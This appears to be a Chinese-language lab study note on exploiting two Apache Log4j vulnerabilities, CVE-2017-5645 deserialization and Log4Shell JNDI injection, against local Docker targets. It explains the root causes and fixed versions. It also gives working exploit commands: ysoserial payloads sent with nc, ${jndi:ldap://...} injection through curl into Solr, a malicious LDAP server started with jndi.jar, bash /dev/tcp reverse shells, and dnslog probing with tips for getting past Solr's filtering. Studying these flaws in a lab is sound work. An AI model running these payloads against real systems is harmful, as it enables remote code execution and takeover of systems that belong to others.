# Apache Log4j 漏洞专题 — AI 详解版

> 本笔记为 AI 整理版，与手写版互补。手写版记操作，本版记原理与坑。
> 2026-08-15/16 实战打通：CVE-2017-5645（TCP 反序列化 RCE）+ CVE-2021-44228（Log4Shell RCE）2/2 全通。

## 一、Log4j 是什么

Apache Log4j 2 = Java 最流行的**日志库**——几乎所有 Java 应用都用它打印日志（"记录谁在什么时候干了什么"）。

**类比**：Log4j = 大楼的**监控记录仪**（记录所有活动）；它的日志内容往往包含**用户输入**（用户名、参数、报错信息……）——**这就是攻击面**。

## 二、CVE-2017-5645：TCP Server 反序列化 RCE（简单题）

### 漏洞原理

Log4j 2.8.2 之前的 **TcpSocketServer**（远程日志服务器，4712 端口）——接收"日志数据"时**直接反序列化**（没做校验）。

**类比**：Log4j 开了一个"收日志的邮筒"（4712）——正常收文本——但邮筒**会拆包裹**（反序列化）——你寄"炸弹包裹"（ysoserial 序列化 payload）→ 一拆就炸。

### 利用（最简单——没有 Web 交互）

```bash
# ① 生成 payload
export PATH=~/Library/Java/JavaVirtualMachines/jdk8u502-b07-jre/Contents/Home/bin:$PATH
cd ~/Desktop/tools/ysoserial
java -jar ysoserial2.jar CommonsCollections5 "touch /tmp/success" > poc_5645.ser

# ② 直接发给 TCP 端口（-w 2 防卡住——服务器不主动关连接）
nc -w 2 localhost 4712 < poc_5645.ser

# ③ 验证
docker exec cve-2017-5645-log4j-1 ls /tmp/success
```

### 反弹 shell

```bash
java -jar ysoserial2.jar CommonsCollections5 'bash -c bash$IFS-i$IFS>&/dev/tcp/host.docker.internal/4444<&1' > rev.ser
nc -w 2 localhost 4712 < rev.ser   # nc -lv 4444 先起
```

## 三、CVE-2021-44228（Log4Shell）：lookup JNDI 注入 RCE（重点）

### 漏洞原理（为什么能 RCE）

Log4j2 2.0~2.14.1 的**日志消息支持 lookup 表达式**：日志内容里的 `${...}` 会被**解析执行**：

```
${env:HOME}        → 展开成环境变量 HOME（正常功能）
${sys:java.version} → 展开成 Java 版本（正常功能）
${jndi:ldap://恶意地址} → 触发 JNDI lookup → 连接恶意 LDAP → 加载远程 class → RCE ❌
```

**漏洞本质**：日志内容（常含用户输入）里的 `${jndi:...}` 被 Log4j 当成**表达式执行**——**不可信输入进入了可执行上下文**（和 XMLDecoder/表达式注入同理）。

**类比**：监控记录仪有个"语音助手"功能——日志里写"查一下今天天气"（${env}）它就真去查——攻击者在日志里写"去某个地址取快递"（${jndi:ldap://恶意}）——**助手（Log4j）就真去取，取回来还拆开执行（反序列化/加载 class）**。

### 影响版本与修复

| 版本 | 状态 |
|---|---|
| 2.0 ~ 2.14.1 | ❌ 漏洞（lookup 默认开启） |
| 2.15.0+ | ✅ 默认禁用 JNDI lookup（修复） |

**2021 年 12 月 Log4Shell 爆发**——几乎全 Java 生态遭殃（Solr、Logstash、Minecraft……）。

## 四、验证（dnslog——不执行代码先确认漏洞）

**目标**：确认 `${jndi:...}` 能被解析（漏洞存在）——用 DNS 请求当"回执"。

```bash
# ① dnslog 生成专属域名（MCP 或网页）→ 得到 xxx.log.gbbnm.com
# ② 发送纯域名版（最关键——先确认能触发）
curl -G "http://localhost:8983/solr/admin/cores" \
  --data-urlencode "action=\${jndi:dns://<我的域名>}"
# ③ dnslog 收到 DNS 记录 = 漏洞确认 ✅
```

**拿 Java 版本（嵌套 lookup，理想情况）**：
```
${jndi:dns://${sys:java.version}.<我的域名>}
→ Log4j 先展开 ${sys:java.version} = 1.8.0_102
→ DNS 查询 1.8.0_102.<我的域名>
→ dnslog 记录里域名含版本号（版本在域名里，不是平台额外字段）
```

**⚠️ 踩坑（我们的环境实测）**：
- `dns://` 在 Solr 报 "Unsupported operation"（Solr 自己拦截）→ **用 `ldap://`**（JNDI 连接 LDAP 时先解析主机名 → 照样发 DNS）
- **嵌套 lookup 点号被 Solr 吞**：`${sys:java.version}.hzoz...` → `${sys:java.version.hzoz...`（键错误 → 展开为空 → 不发 DNS）——**README 环境正常，Solr 8.11 有差异**——版本拿不到就**本地 docker exec 查**（`docker exec 容器 java -version`——靶场特权；实战中版本拿不到也能打，试了就知道 RCE 方式）

## 五、RCE（jndi.jar——和 21839 同一条链）

前提：目标 JDK < 8u191（远程 class 加载可用）——本靶场 1.8.0_102 ✅

```bash
# ① 起恶意 LDAP 服务器（工具 = Java Chains 的等价品）
export PATH=~/Library/Java/JavaVirtualMachines/jdk8u502-b07-jre/Contents/Home/bin:$PATH
java -jar ~/Desktop/tools/jndi.jar -C "touch /tmp/success" -A "host.docker.internal"
# → 打印 ldap://host.docker.internal:1389/xxx（复制）

# ② 发送（xxx = 工具打印的名字）
curl -G "http://localhost:8983/solr/admin/cores" \
  --data-urlencode "action=\${jndi:ldap://host.docker.internal:1389/xxx}"

# ③ 验证
docker exec cve-2021-44228-solr-1 ls /tmp/success
```

**利用链**：目标解析 `${jndi:ldap://...}` → 连恶意 LDAP(1389) → 拿到恶意 class 地址 → 下载执行 → 命令执行 ✅

## 六、反弹 shell

把 jndi.jar 的 `-C` 命令换成 $IFS 版（exec 拆分老规矩）：

```bash
java -jar ~/Desktop/tools/jndi.jar -C 'bash -c bash$IFS-i$IFS>&/dev/tcp/host.docker.internal/4444<&1' -A "host.docker.internal"
# nc -lv 4444 先起 → 重新发送新 payload 地址 → nc 收 root shell
```

## 七、踩坑清单

1. **`dns://` vs `ldap://`**：dns:// 在 Solr 被拦（Unsupported operation）→ 用 ldap://（照样发 DNS）
2. **嵌套 lookup 点号被吞**（Solr 8.11）：版本号拿不到 → docker exec 查（本地）或直接打
3. **nc 卡住**：Log4j TCP 服务器不关连接 → 加 `-w 2`
4. **jndi.jar 路径**：已移到 `~/Desktop/tools/jndi.jar`（21839 目录里的旧路径没了）
5. **export 和 java 必须分行**（或 `&&`）——一行会跑挂

## 八、两个漏洞对比

| 漏洞 | 版本 | 类型 | 触发方式 | 难度 |
|---|---|---|---|---|
| CVE-2017-5645 | ≤2.8.1 | TCP 反序列化 | nc 直接发 payload | 简单 |
| CVE-2021-44228 | 2.0~2.14.1 | lookup JNDI 注入 | 日志里 `${jndi:...}` | 中 |

**共性**：都是"**不可信输入进入可执行上下文**"——5645 是输入进反序列化，44228 是输入进 lookup 表达式。

## 九、一句话总结

> **Log4j 两大坑**：① TCP 日志服务器反序列化（寄炸弹包裹）；② 日志消息的 `${}` lookup 表达式会执行 JNDI（写一句 `${jndi:ldap://恶意}` 就 RCE）。
> **Log4Shell 的核心**：日志内容（常含用户输入）被当成**代码**执行——**识别"用户输入进日志"的应用 + 构造 `${jndi:...}` payload = RCE**。
> **实战识别**：参数/输入会出现在日志里的应用（报错信息、访问日志）——发 `${jndi:dns://域名}` 看 DNS 回执，再升级 RCE。
